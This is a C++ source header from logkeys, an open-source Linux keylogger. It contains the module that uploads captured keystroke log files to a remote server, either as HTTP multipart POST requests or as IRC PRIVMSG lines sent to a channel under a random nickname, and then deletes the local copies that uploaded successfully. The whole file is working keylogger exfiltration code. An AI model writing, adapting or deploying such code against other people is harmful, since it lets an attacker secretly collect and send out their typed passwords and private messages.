/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: http://code.google.com/p/logkeys/
*/

#ifndef _UPLOAD_H_
#define _UPLOAD_H_

#define UPLOADER_PID_FILE "/var/run/logkeys.upload.pid"  // pid file for the remote-uploading process

namespace logkeys {

int sendall(int sockfd, const char *buf, size_t len)
{
  size_t total = 0;
  int n = 0;    // how many bytes we've sent
  size_t bytesleft = len;  // how many we have left to send

  while(total < len) {
    if ((n = send(sockfd, buf + total, bytesleft, 0)) == -1)
      break;
    total += n;
    bytesleft -= n;
  }

  return n == -1 ? -1 : 0; // return -1 on failure, 0 on success
}

int open_connection(const char *server, const char *port)
{
  struct addrinfo *servinfo, *p;  // servinfo will point to IP results
  struct addrinfo hints = {0};
  hints.ai_family = AF_UNSPEC;      // will "resolve" both IPv4 or IPv6 addresses/hosts
  hints.ai_socktype = SOCK_STREAM;  // we will use TCP stream
  
  int status, sockfd;
  if ((status = getaddrinfo(server, port, &hints, &servinfo)) != 0)
    error(EXIT_FAILURE, 0, "getaddrinfo() error (%s:%s): %s", server, port, gai_strerror(status));
  
  // loop through the servinfo list and connect to the first connectable address
  for (p = servinfo; p != NULL; p = p->ai_next) {
    if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
      continue;
    if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
      close(sockfd);
      continue;
    }
    break;
  }
  
  if (p == NULL) sockfd = -1;  // if connecting failed, return -1
  
  freeaddrinfo(servinfo);  // free the servinfo linked-list
  
  return sockfd;
}

char * read_socket(int sockfd)
{
#define STR_SIZE 1000000    
  static char str[STR_SIZE] = {0};
  if (recv(sockfd, str, STR_SIZE, 0) == -1)
    return NULL;
  return str;
}

int sockfd;
bool isKilled = false;

void uploader_signal_handler(int signal)
{
  isKilled = true;
  close(sockfd);
}

void start_remote_upload()
{
  int pid_fd = open(UPLOADER_PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0644);
  if (pid_fd == -1) {
    error(EXIT_FAILURE, errno, "Error creating uploader PID file '" UPLOADER_PID_FILE "'");
  }
  
  // catch SIGHUP, SIGINT, SIGTERM signals to exit gracefully
  struct sigaction act = {{0}};
  act.sa_handler = uploader_signal_handler;
  sigaction(SIGHUP,  &act, NULL);
  sigaction(SIGINT,  &act, NULL);
  sigaction(SIGTERM, &act, NULL);
  
#define MAX_FILES 1000
  char successful[MAX_FILES] = {0};  // array holding results
  
  int last_index;  // determine how many logfiles.X are there
  for (last_index = 1; last_index < MAX_FILES; ++last_index) {
    std::stringstream filename;
    filename << args.logfile << '.' << last_index;
    std::ifstream ifs(filename.str().c_str());
    
    if (!ifs) break;
    ifs.close();
  }
  --last_index;  // logfile.last_index is the last one
  
  // POST to remote HTTP server
  if (args.http_url) {
    
    std::string url = std::string(args.http_url);
    std::string port = "80";
    std::string host = url.substr(url.find("://") + 3);
    std::string location = host.substr(host.find("/"));
    host = host.substr(0, host.find("/"));
    
    if (host.find(":") != std::string::npos) {  // if port specified (i.e. "http://hostname:port/etc")
      port = host.substr(host.find(":") + 1);
      host = host.substr(0, host.find(":"));
    }
    
    srand(time(NULL));
    
    for (int i = 1; i <= last_index && !isKilled; ++i) {
      
      std::stringstream filename;
      filename << args.logfile << '.' << i;
      std::ifstream ifs(filename.str().c_str());
      
      if (!ifs) break;
      
      sockfd = open_connection(host.c_str(), port.c_str());
      
      if (sockfd == -1) break;
      
      std::string line, file_contents;
      while(getline(ifs, line)) file_contents += line + "\n";
      ifs.close();
      
      std::stringstream boundary, postdata, obuf;
      boundary << "---------------------------" << time(NULL) << rand() << rand();
      
      postdata << "--" << boundary.str() << "\r\n" << 
        "Content-Disposition: form-data; name=\"file\"; filename=\"" << filename.str() << "\"\r\n"
        "Content-Type: text/plain\r\n\r\n" << file_contents << "\r\n--" << boundary.str() << "--\r\n";
      
      obuf << 
        "POST " << location << " HTTP/1.1\r\n"
        "Host: " << host << "\r\n"
        "User-Agent: logkeys (http://code.google.com/p/logkeys/)\r\n"
        "Accept: */*\r\n"
        "Content-Type: multipart/form-data; boundary=" << boundary.str() << "\r\n"
        "Content-Length: " << postdata.str().size() << "\r\n"
        "\r\n" << postdata.str();
      
      if (sendall(sockfd, obuf.str().c_str(), obuf.str().size()) == -1) {
        close(sockfd);
        error(0, errno, "Error sending output");
        break;
      }
      sleep(1);
      
      if (strncmp(read_socket(sockfd), "HTTP/1.1 200", 12) == 0)
        ++successful[i - 1];
      
      if (successful[i - 1] && !args.irc_server) remove(filename.str().c_str());
      
      close(sockfd);
    }
  }
  
  // post to remote IRC server
  if (args.irc_server && !isKilled) {
    
    sockfd = open_connection(args.irc_server, args.irc_port);
    if (sockfd == -1) { 
      remove(UPLOADER_PID_FILE);
      error(EXIT_FAILURE, errno, "Failed to connect to remote server(s)");
    }
    
    fprintf(stderr, "posting IRC...\n");  // debug
    
    srand(time(NULL));
    int random = rand() % 999999;  // random 6 digits will be part of IRC nickname
    std::stringstream obuf;
    obuf << "USER lk" << random << " 8 * :http://code.google.com/p/logkeys\r\n"
            "NICK lk" << random << "\r\n";
    if (args.irc_entity[0] == '#')  // if entity is a channel, add command to join it
      obuf << "JOIN " << args.irc_entity << "\r\n";
    
    if (sendall(sockfd, obuf.str().c_str(), obuf.str().size()) == -1) {
      remove(UPLOADER_PID_FILE);
      error(EXIT_FAILURE, errno, "Error sending output");
    }
    obuf.clear();
    obuf.str("");
    
    for (int i = 1; i <= last_index && !isKilled; ++i) {
      std::stringstream filename;
      filename << args.logfile << '.' << i;
      std::ifstream ifs(filename.str().c_str());
      
      if (!ifs) break;
      
      std::string line;      
      while (std::getline(ifs, line)) {
#define IRC_MAX_LINE_SIZE 400
        while (line.size() > IRC_MAX_LINE_SIZE) {
          obuf << "PRIVMSG " << args.irc_entity << " :"
              << line.substr(0, IRC_MAX_LINE_SIZE) << "\r\n";
          
          if (sendall(sockfd, obuf.str().c_str(), obuf.str().size()) == -1) {
            remove(UPLOADER_PID_FILE);
            error(EXIT_FAILURE, errno, "Error sending output");
          }
          obuf.clear();
          obuf.str("");
          sleep(1);
          line = line.substr(IRC_MAX_LINE_SIZE);
        }
        obuf << "PRIVMSG " << args.irc_entity << " :" << line << "\r\n";
        
        if (sendall(sockfd, obuf.str().c_str(), obuf.str().size()) == -1) {
          remove(UPLOADER_PID_FILE);
          error(EXIT_FAILURE, errno, "Error sending output");
        }
        obuf.clear();
        obuf.str("");
      }
      
      ifs.close();
      sleep(1);
      
      ++successful[i - 1];
    }
    close(sockfd);
  }
  
  char successful_treshold = 0; // determine how many post methods were supposed to be used
  if (args.http_url)   ++successful_treshold;
  if (args.irc_server) ++successful_treshold;
  
  // remove all successfully uploaded files...
  for (int i = 1, j = 1; i <= last_index; ++i) {
    std::stringstream filename;
    filename << args.logfile << '.' << i;
    
    if (successful[i - 1] == successful_treshold) {
      remove(filename.str().c_str());
    }
    else if (i != j) {  // ...and rename unsuccessfully uploaded files so they run in uniform range logfile.X for X = 1..+
      std::stringstream target_name;
      target_name << args.logfile << '.' << j;
      rename(filename.str().c_str(), target_name.str().c_str());
      ++j;
    }
  }
  
  close(pid_fd);
  remove(UPLOADER_PID_FILE);
}

} // namespace logkeys

#endif  // _UPLOAD_H_
